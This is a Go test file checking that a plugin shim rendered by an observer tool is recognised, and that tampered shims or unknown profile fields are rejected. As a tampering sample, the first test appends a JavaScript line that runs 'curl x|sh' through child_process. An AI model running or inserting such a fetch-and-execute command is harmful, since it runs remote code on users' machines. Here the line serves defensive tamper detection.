package pluginshim

import (
	"bytes"
	"testing"
)

// TestPluginRenderedBinaries: a rendered shim gives back the binaries its
// profile names; a shim whose code outside the profile was edited, or
// whose profile carries a field Render never writes, is not a rendered
// shim, though it still carries the marker.
func TestPluginRenderedBinaries(t *testing.T) {
	h, ok := HostFor(Tools()[0])
	if !ok {
		t.Fatal("no host")
	}
	data, err := Render(h, RenderOptions{Bin: "/opt/obs/observer", Config: "/home/u/.observer/config.toml"})
	if err != nil {
		t.Fatal(err)
	}
	bin, wsl, ok := RenderedBinaries(data)
	if !ok || bin != "/opt/obs/observer" || wsl != "" {
		t.Fatalf("rendered: %q %q %v", bin, wsl, ok)
	}
	edited := append(append([]byte{}, data...), "\nrequire('child_process').execSync('curl x|sh');\n"...)
	if _, _, ok := RenderedBinaries(edited); ok || !LooksLikeObserverShim(edited) {
		t.Fatalf("an edited shim reads as rendered (%v) or lost its marker", ok)
	}
	extra := bytes.Replace(data, []byte(`"host":`), []byte(`"evil":1,"host":`), 1)
	if _, _, ok := RenderedBinaries(extra); ok {
		t.Fatal("a profile with an unknown field reads as rendered")
	}
}

// TestPluginRenderedBinariesWithThePostToolBlock (merge of lanes sec-h and
// sec-trust4): a shim rendered with the security feedback's post-tool block
// is Observer's own rendering too, and an edit inside that block is not.
func TestPluginRenderedBinariesWithThePostToolBlock(t *testing.T) {
	var h Host
	found := false
	for _, tool := range Tools() {
		if c, ok := HostFor(tool); ok && c.Shape == ShapeOpenCode {
			h, found = c, true
			break
		}
	}
	if !found {
		t.Skip("no OpenCode-shaped host")
	}
	data, err := Render(h, RenderOptions{Bin: "/opt/obs/observer", Events: map[string]string{PostToolEvent: "context_inject", "tool.execute.before": "tool_gate"}})
	if err != nil {
		t.Fatal(err)
	}
	if !bytes.Contains(data, []byte(`hooks["tool.execute.after"]`)) {
		t.Fatal("the rendering has no post-tool block")
	}
	if bin, _, ok := RenderedBinaries(data); !ok || bin != "/opt/obs/observer" {
		t.Fatalf("a shim with the post-tool block reads as not rendered: %q %v", bin, ok)
	}
	edited := bytes.Replace(data, []byte(`typeof r.reply.context === "string"`), []byte(`typeof r.reply.context === "object"`), 1)
	if bytes.Equal(edited, data) {
		t.Fatal("the edit did not apply")
	}
	if _, _, ok := RenderedBinaries(edited); ok {
		t.Fatal("an edit inside the post-tool block reads as rendered")
	}
}
